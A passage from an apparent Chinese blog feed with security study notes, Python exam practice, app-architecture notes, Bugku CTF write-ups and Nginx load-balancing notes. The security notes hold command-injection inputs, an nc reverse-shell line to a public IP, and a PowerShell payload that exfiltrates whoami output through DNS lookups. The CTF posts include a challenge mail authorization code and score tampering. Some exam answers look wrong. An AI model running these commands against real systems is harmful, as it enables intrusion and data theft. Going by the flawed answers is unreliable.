cmd 47.122.23.131 5566</span><br><span class="line">Windows：127.0.0.1 | nc -e cmd -lvvp 5566</span><br><span class="line"></span><br><span class="line">正反向反弹案例-内网服务器</span><br><span class="line">只能内网主动交出数据，反向连接</span><br></pre></td></tr></table></figure><h2 id="实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog"><a href="#实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog" class="headerlink" title="实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog"></a>实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog</h2><p>出站入站都开启策略（数据不回显）： <strong>OSI网络七层</strong></p><p>真实应用的情况：真实情况会 <strong>限制很多端口</strong> 。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.f4an93.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure><blockquote><p>漏洞有，但是数据 <strong>不回显</strong> ：<br>1、反弹shell<br>2、带外查询 =&gt; 数据不回显的时候使用它</p></blockquote><p>确定能执行命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">windows不能执行下面的Linux命令符：</span><br><span class="line">` ` ; </span><br><span class="line"></span><br><span class="line">Windows Ping命令管道：</span><br><span class="line">ping 127.0.0.1 | </span><br></pre></td></tr></table></figure><p><strong>起因</strong> :</p><ul><li>cmd无法执行whoami</li><li>用到powershell变量赋值 把whoami执行结果给变量</li><li>结果带有“\” 导致ping无法执行</li></ul><p><strong>目的</strong> ：获取主机的whoami<br><strong>使用</strong> ：配合powershell和dnslog.cn查询服务器的管理员名称</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 说简单点，就是：通过ping命令获取whoami，</span></span><br><span class="line"><span class="comment"># 并且通过替换掉斜杠的方式将主机的whoami通过ping命令传出</span></span><br><span class="line">powershell <span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.nghao0.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br><span class="line"><span class="comment"># 顺序可换，但必须合乎逻辑。</span></span><br><span class="line">powershell <span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$y</span>=<span class="string">&#x27;.nghao0.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;<span class="variable">$zz</span>=<span class="variable">$z</span>.replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);ping <span class="variable">$zz</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-复习日志-0004</title>
      <link href="/2023/03/21/Python-Study-0004/"/>
      <url>/2023/03/21/Python-Study-0004/</url>
      
        <content type="html"><![CDATA[<p>25号开考，做点真题护护身……</p><span id="more"></span><h1 id="实践1"><a href="#实践1" class="headerlink" title="实践1"></a>实践1</h1><p><img src="c1.jpg" alt="格式化输出"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入正整数:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;______&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入正整数:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:-&gt;20,&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br></pre></td></tr></table></figure><h1 id="实践2"><a href="#实践2" class="headerlink" title="实践2"></a>实践2</h1><p><img src="c3.jpg" alt="数组"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line">b =  <span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#例如：[1,2,3]</span></span><br><span class="line">_________</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    s += a[i]*b[i]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line">b =  <span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#例如：[1,2,3]</span></span><br><span class="line">b=<span class="built_in">list</span>(b);s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    s += a[i]*b[i]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h1 id="实践3"><a href="#实践3" class="headerlink" title="实践3"></a>实践3</h1><p><img src="c3.jpg" alt="随机数"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">______</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(______):</span><br><span class="line">    <span class="built_in">print</span>(______, end=<span class="string">&quot;,&quot;</span>)</span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">123</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.randint(<span class="number">1</span>,<span class="number">999</span>), end=<span class="string">&quot;,&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="实践4"><a href="#实践4" class="headerlink" title="实践4"></a>实践4</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ______</span><br><span class="line">brandlist = [<span class="string">&#x27;华为&#x27;</span>,<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;诺基亚&#x27;</span>,<span class="string">&#x27;OPPO&#x27;</span>,<span class="string">&#x27;小米&#x27;</span>]</span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">______ </span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">brandlist = [<span class="string">&#x27;华为&#x27;</span>,<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;诺基亚&#x27;</span>,<span class="string">&#x27;OPPO&#x27;</span>,<span class="string">&#x27;小米&#x27;</span>]</span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">name = random.randint(<span class="number">0</span>,<span class="number">5</span>) </span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><h1 id="实践5"><a href="#实践5" class="headerlink" title="实践5"></a>实践5</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串&quot;</span>)</span><br><span class="line">n = ______ </span><br><span class="line">m = ______</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;中文字符数为&#123;&#125;，中文词语数为&#123;&#125;。&quot;</span>.<span class="built_in">format</span>(n, m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串&quot;</span>)</span><br><span class="line">n = <span class="built_in">len</span>(s) </span><br><span class="line">m = <span class="built_in">len</span>(jieba.lcut(s))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;中文字符数为&#123;&#125;，中文词语数为&#123;&#125;。&quot;</span>.<span class="built_in">format</span>(n, m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="实践6"><a href="#实践6" class="headerlink" title="实践6"></a>实践6</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在...处使用一行或多行代码替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入数量：&quot;</span>))</span><br><span class="line">......   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;总额为:&quot;</span>,cost)</span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入数量：&quot;</span>))</span><br><span class="line">cost = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">    cost = <span class="number">160</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">2</span> &lt;= n &lt;= <span class="number">4</span>:</span><br><span class="line">    cost = <span class="number">160</span>*<span class="number">0.9</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">5</span> &lt;= n &lt;= <span class="number">9</span>:</span><br><span class="line">    cost = <span class="number">160</span>*<span class="number">0.8</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    cost = <span class="number">160</span>*<span class="number">0.7</span>   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;总额为:&quot;</span>,cost)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0009-基础安卓篇</title>
      <link href="/2023/03/21/SEC-Study-0009/"/>
      <url>/2023/03/21/SEC-Study-0009/</url>
      
        <content type="html"><![CDATA[<p>基础安卓</p><span id="more"></span><h1 id="001-基础入门-蓝图"><a href="#001-基础入门-蓝图" class="headerlink" title="001-基础入门-蓝图"></a>001-基础入门-蓝图</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、Web常规-系统&amp;中间件&amp;数据库&amp;源码等<br>2、Web其他-前后端&amp;软件&amp;Docker&amp;分配站等<br>3、Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡等</p><hr><p>1、APP架构-封装&amp;原生态&amp;H5&amp;flutter等<br>2、小程序架构-Web&amp;H5&amp;JS&amp;VUE框架等</p><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>应用架构：Web/APP/云应用/小程序/负载均衡等<br>安全产品：CDN/WAF/IDS/IPS/蜜罐/防火墙/杀毒等<br>渗透命令：文件上传下载/端口服务/Shell反弹等<br>抓包技术：HTTP/TCP/UDP/ICMP/DNS/封包/代理等<br>算法加密：数据编码/密码算法/密码保护/反编译/加壳等</p><h2 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h2><p>1、原生开发<br>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。<br>简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>2、使用H5语言开发<br>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。<br>结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><p>3、使用flutter开发<br>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。<br>但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><p>4、常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。<br>Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载。<br>所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><h1 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h1><p>判断app原生态还是web封装：</p><ul><li>凭经验，没有工具直接分析。界面美观程度，功能按钮，显示正常不正常等等。</li><li>反编译看源码</li></ul><h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>演示：remusic项目源码<br>说明：</p><ul><li>一点一点设计的，不是网页转app的那一套。</li><li>成套源码设计，app主导是java，成本高+最难</li><li>用户体验好，符合手机。</li></ul><p>安全影响：</p><ul><li>反编译<ul><li>提取源码</li><li>提取源码当中的资产</li><li>提取资产进行常规测试</li><li>反编译看协议</li><li>看的是写到的资产</li></ul></li><li>抓包<ul><li>抓数据包提取资产</li><li>资产类型常规测试</li></ul></li><li>逆向的角度去(反编译)分析逻辑设计安全（多）</li></ul><h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p>演示：ShopXO源码程序+一门APP打包<br>说明：</p><ul><li>web页面封装进入app，本质上还是web页面。</li><li>用户体验差，有些不符合手机观感。</li></ul><p>安全影响：常规Web安全测试</p><h2 id="APP-开发架构-H5-amp-Vue-HBuilderX"><a href="#APP-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h2><p>演示：HBuilderX案例<br>说明：相对于web封装，换了一种实现的语言。<br>安全影响：</p><ul><li>API-接口安全</li><li>JS框架安全问题</li><li>JS前端测试</li></ul><h2 id="APP逆向和APP安全"><a href="#APP逆向和APP安全" class="headerlink" title="APP逆向和APP安全"></a>APP逆向和APP安全</h2><p>APP逆向侧重点在代码层面，而APP安全测试在资产层面。</p><h1 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h1><h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p>演示：ShopXO源码程序+一门APP打包<br>搭建：HBuilderX<br>安全影响：常规Web安全测试</p><h2 id="WX小程序-开发架构-H5-amp-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p>演示：HBuilderX案例<br>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习日志-002</title>
      <link href="/2023/03/20/CTF-web-002/"/>
      <url>/2023/03/20/CTF-web-002/</url>
      
        <content type="html"><![CDATA[<p>题库来源：bugku web题 – flag</p><span id="more"></span><h1 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h1><p>启动环境，打开网站后就是一顿弹窗……(弹窗没截图)</p><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/CTF2.jpg?raw=true" alt="开启靶场"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/CTF3.jpg?raw=true" alt="BP拦截，获取关键数据"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#102;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#103;</span><span class="symbol">&amp;#123;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#98;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#100;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#57;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#57;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#102;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#102;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#50;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#98;</span><span class="symbol">&amp;#57;</span><span class="symbol">&amp;#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/CTF4.jpg?raw=true" alt="丢到html文档"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/CTF5.jpg?raw=true" alt="浏览器直接打开"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/CTF1.jpg?raw=true" alt="完成"><br>总结：没什么知识量，bp拦截流量包后放到重发器就能跳过js弹窗了。</p><h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>这题……和上面一个原理，没什么意思。</p><p>总体思路只有一条：抓包，看包。管你网页闪烁的再快，被bp拦截后只能原形毕露。</p><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/ctf6.jpg?raw=true" alt="启动靶场"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/ctf7.jpg?raw=true" alt="bp拦截"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/ctf8.jpg?raw=true" alt="发现flag"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/ctf9.jpg?raw=true" alt="提交"></p><h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>这道题目缺少了关键信息，关键信息是放在<a href="mailto:&#98;&#117;&#x67;&#x6b;&#x75;&#107;&#117;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#109;">&#98;&#117;&#x67;&#x6b;&#x75;&#107;&#117;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#109;</a>当中的。</p><p>所以为了做这道题目，参照了部分网络wp。</p><p>总体思路是这样子的：</p><ul><li>获得一个页面，url为：<a href="http://114.67.175.224:18971/">http://114.67.175.224:18971/</a></li><li>对这个url进行目录扫描，得到一些关键信息</li><li><img src="c11.jpg" alt="关键信息"></li><li>全访问无果，回去看主题页，有个zip下载链接。</li><li>目标：拿下后台账密</li><li>里面有exe软件，<ul><li>思路1：逆向</li><li>思路2：抓包</li></ul></li><li>直接抓包最简单：<ul><li><img src="c13.jpg" alt="抓包信息"></li></ul></li><li>抓包完成后对密码进行base64破解<ul><li><a href="mailto:&#98;&#117;&#103;&#x6b;&#x75;&#107;&#x75;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#x6d;">&#98;&#117;&#103;&#x6b;&#x75;&#107;&#x75;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a></li><li>YnVna3VrduxNjMuY29t</li><li>XSLROCPMNWWZQDZL(base64解密)<ul><li><img src="ctf14.jpg" alt="base64解密"></li></ul></li></ul></li><li>后台账密使用上面的账目登不上<ul><li>真的密码错误</li><li>账户另有其人</li></ul></li><li>尝试使用163邮箱登录<ul><li>邮箱登录的方式，主流是两种，<ul><li>官网提供的邮箱登录：账号+密码登录(尝试失败)</li><li>第三方邮件系统登录：客户端+授权码登录(尝试成功)</li></ul></li><li>登录设备：手机版QQ邮箱(方便，有授权码也可以登录)</li><li>账户：<a href="mailto:&#98;&#x75;&#x67;&#x6b;&#117;&#107;&#117;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;">&#98;&#x75;&#x67;&#x6b;&#117;&#107;&#117;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;</a></li><li>授权码：XSLROCPMNWWZQDZL</li></ul></li><li>登录后，发现Foxmail发送过来的测试邮件，判断为电脑端可用于授权码登录的登录软件</li><li>使用授权码在Foxmail登录后，发现某些关键邮件被删除(也就是这里，bugku官方的提示信息被删除了，在网络上补充一张图过来)<ul><li><img src="ctf15.jpg" alt="补充"></li></ul></li><li>关键信息：mara这人在2021年2月8日前两日过生日<ul><li>姓名：mara，生日：20010206</li></ul></li><li>将这俩信息尝试输入到后台账密当中，登录成功并获取到flag<ul><li><img src="ctf16.jpg" alt="flag"></li><li><img src="ctf20.jpg" alt="提交"></li></ul></li></ul><h1 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h1><p>思路：改掉游戏传输的数据包，获得flag。</p><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c21.jpg?raw=true" alt="打开题目"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c22.jpg?raw=true" alt="游戏界面"></p><p>玩一把后抓取数据包，看到<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c23.jpg?raw=true" alt="数据包"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c24.jpg?raw=true" alt="通过最后一个栈进入脚本"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c25.jpg?raw=true" alt="对应的函数或方法"><br>其实都到这个地步了，有一个简单的办法钻空子。</p><p>将分数进行base64编码，并且拿出get数据传输的那个base64一对比，就知道base64数据包多了什么少了什么了<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c26.jpg?raw=true" alt="技巧"><br>114.67.175.224:17405/score.php?score=99999&amp;ip=218.16.231.251&amp;sign=zMOTk5OTk===<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c27.jpg?raw=true" alt="Flag"><br>flag{b526198a8310befd48903597655c2e55}<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/CTF-web-002/c30.jpg?raw=true" alt="提交"></p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0008-基础web篇</title>
      <link href="/2023/03/20/SEC-Study-0008/"/>
      <url>/2023/03/20/SEC-Study-0008/</url>
      
        <content type="html"><![CDATA[<p>基础web</p><span id="more"></span><h1 id="001-基础入门-蓝图"><a href="#001-基础入门-蓝图" class="headerlink" title="001-基础入门-蓝图"></a>001-基础入门-蓝图</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>Web常规-系统&amp;中间件&amp;数据库&amp;源码等</li><li>Web其他-前后端&amp;软件&amp;Docker&amp;分配站等</li><li>Web拓展-CDN&amp;WAF&amp;OSS&amp;静态&amp;负载均衡等</li></ol><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web/APP/云应用/三方服务/负载均衡等</li><li>安全产品：CDN/WAF/IDS/IPS/蜜罐/防火墙/杀毒等</li><li>渗透命令：文件上传下载/端口服务/Shell反弹等</li><li>抓包技术：HTTP/TCP/UDP/ICMP/DNS/封包/代理等</li><li>算法加密：数据编码/密码算法/密码保护/反编译/加壳等</li></ul><p>主要是对我们安全测试的影响。</p><h1 id="拓展模式"><a href="#拓展模式" class="headerlink" title="拓展模式"></a>拓展模式</h1><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>原理：Web应用防火墙，旨在提供保护<br>影响：常规Web安全测试手段会受到拦截<br>演示：免费D盾防护软件<br>Windows2012 + IIS +D盾 =&gt; 出现弹窗警告<br>绕过：大部分无法绕过，看产品看运气，除非WAF很垃圾</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>原理：内容分发服务，旨在提高各个地区的访问网站的速度<br>影响：隐藏真实源IP，导致对目标测试错误(扫错IP地址)<br>演示：阿里云备案域名全局CDN加速服务<br>Windows2012 + BT宝塔面板 + CDN服务</p><h2 id="OSS"><a href="#OSS" class="headerlink" title="OSS"></a>OSS</h2><p>原理：云存储服务，旨在提高访问速度<br>演示：<a href="https://cloudreve.org/">https://cloudreve.org/</a><br>Windows2012 + cloudreve + 阿里云OSS<br><a href="https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1">https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1</a><br>1、启动应用<br>2、登录管理<br>3、配置存储信息<br>4、更改用户组存储属性</p><p>阿里云OSS:<br>1、开通OSS<br>2、新建Bucket<br>3、配置Bucket属性<br>4、配置Access访问</p><p>原理：<br>为什么要使用第三方存储？<br>1）静态文件会占用大量带宽<br>2）加载速度<br>3）存储空间<br>影响：<br>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储<br>1、修复上传安全<br>2、文件解析不一样<br>3、但Accesskey隐患(秘钥控制)=&gt;(人安全)</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><strong>正向代理</strong> 为 <strong>客户端服务</strong> ,客户端主动建立代理访问目标（不代理不可达）（&lt;手机&gt;你主动建立代理与服务器建立连接）<br><strong>反向代理</strong> 为 <strong>服务端服务</strong> ,服务端主动转发数据给可访问地址（不主动不可达）（&lt;服务器&gt;别人找个服务器代替他与你建立连接，相当于服务器仅做转发）<br>原理：通过网络反向代理转发真实服务达到访问目的<br>影响：访问目标只是一个代理，非真实应用服务器<br>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！<br>演示：</p><ul><li>配置域名<ul><li>将域名正向代理配置为指定IP地址</li><li>再将域名反向配置到百度</li><li>结果就是访问该域名时解析到百度的页面去了。</li><li>测试与自身源代网站没关系</li></ul></li><li>Nginx反向代理配置<ul><li>Windows2012 + BT宝塔面板 + Nginx</li></ul></li></ul><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务<br>影响：有多个服务器加载服务，测试过程中存在多个目标情况<br>演示：Nginx负载均衡配置<br>Windows2012 + BT宝塔面板 + Nginx</p><h3 id="定义负载设置"><a href="#定义负载设置" class="headerlink" title="定义负载设置"></a>定义负载设置</h3><p>配置负载均衡服务器的路径<br>weight是权重，哪个大以哪个为准。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream fzjh&#123;</span><br><span class="line">    server 47.94.236.117:80 weight=2;</span><br><span class="line">    server 47.122.22.195:80 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定义访问路径-访问策略"><a href="#定义访问路径-访问策略" class="headerlink" title="定义访问路径 访问策略"></a>定义访问路径 访问策略</h3><p>下面配置完成后会向上访问。<br>上下的 <strong>fzjh</strong> 要互相对应。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    访问路径        访问路径到负载均衡</span><br><span class="line">    proxy_pass 